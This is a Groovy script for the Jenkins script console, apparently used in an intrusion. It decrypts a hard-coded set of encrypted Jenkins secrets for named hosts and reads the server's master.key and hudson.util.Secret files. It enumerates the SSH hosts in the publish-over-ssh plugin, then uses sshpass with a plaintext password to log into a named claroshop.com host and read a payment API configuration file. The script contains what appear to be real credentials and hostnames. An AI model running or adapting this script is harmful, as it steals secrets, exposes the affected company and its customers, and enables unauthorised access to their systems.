// MICRO-Z2: Correct Jenkins secret decryption + SSH via plugin API
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
import com.cloudbees.plugins.credentials.CredentialsProvider
import jenkins.model.Jenkins

def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(3000)
}

println "=== METHOD 1: Secret.decrypt with braces ==="
def secretsToDecrypt = [
    "CSDEV01-2":    "{AQAAABAAAAAQu80z2+IB7HCyH6EqB7CyrqD/8L59GLuNixILnRADawE=}",
    "CSDEV01-2b":   "{AQAAABAAAAAQ7K3Uu2VE7T77LzQyxgLReAiUqyyROlgpGpuXqTEixFQ=}",
    "CSQAAPP01-1":  "{AQAAABAAAAAQvCfrolDy/ZNokUSuHnrCLCvkuSvvyESOlJo+6Z48AsU=}",
    "CSQAAPP03-1":  "{AQAAABAAAAAQb8UMijhFNc9zvtPMpo+Wl5ryaJOVm/L6n1Qqz5eE+pk=}",
    "CSQAAPP04-1":  "{AQAAABAAAAAQqf5WMgNDJt9tVsyOGTBSkTzXASXxv5FbvYSfwVorrkU=}",
    "CSDEV02-2":    "{AQAAABAAAAAQOhIvdp3WRg1x/HOctUYT0QoZdRIU3AUhn04k2fYnzPI=}",
]
secretsToDecrypt.each { host, enc ->
    def plain = hudson.util.Secret.decrypt(enc)
    println "  ${host} => '${plain}'"
}

println "\n=== METHOD 2: Hudson cipher decrypt ==="
secretsToDecrypt.each { host, enc ->
    try {
        def secret = hudson.util.Secret.fromString(enc)
        println "  ${host} => '${secret.getPlainText()}'"
    } catch(e) {
        println "  ${host} => ERR: ${e.message?.take(80)}"
    }
}

println "\n=== METHOD 3: Read master.key and decrypt manually ==="
def masterKey = run("cat /var/jenkins_home/secrets/master.key 2>/dev/null")
def hudsonKey = run("xxd -p /var/jenkins_home/secrets/hudson.util.Secret 2>/dev/null | head -5")
println "master.key exists: ${masterKey?.trim()?.take(20)}"
println "hudson.util.Secret hex: ${hudsonKey.take(200)}"

println "\n=== METHOD 4: Use Jenkins SSH to run command on CSDEV01-2 ==="
// Try to use the publish_over_ssh plugin to run a command
try {
    def plugin = jenkins.model.Jenkins.instance.getPlugin("publish-over-ssh")
    if (plugin) {
        println "SSH Plugin found: " + plugin.getClass().name
        def config = jenkins.plugins.publish_over_ssh.descriptor.BapSshPublisherPluginDescriptor.get()
        def hosts = config?.getHostConfigurations()
        println "Hosts: " + hosts?.collect { it.name }?.join(", ")
    } else {
        println "SSH Plugin not found by name"
    }
} catch(e) {
    println "Plugin access err: ${e.message?.take(100)}"
}

println "\n=== METHOD 5: Try SSH directly with known creds ==="
// The jenkins user may have a password we already know
def sshTest = run("sshpass -p 'e6LBqIkOI\$PR1XX2oia' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 jenkins@CSDEV01-2.dev.claroshop.com 'cat /var/www/html/claroshop/caja-pagos-api/config/local.php 2>/dev/null | head -50' 2>&1")
println "SSH test CSDEV01-2 (jenkins pw): " + sshTest.take(1000)

println "\n=== DONE MICRO-Z2 ==="
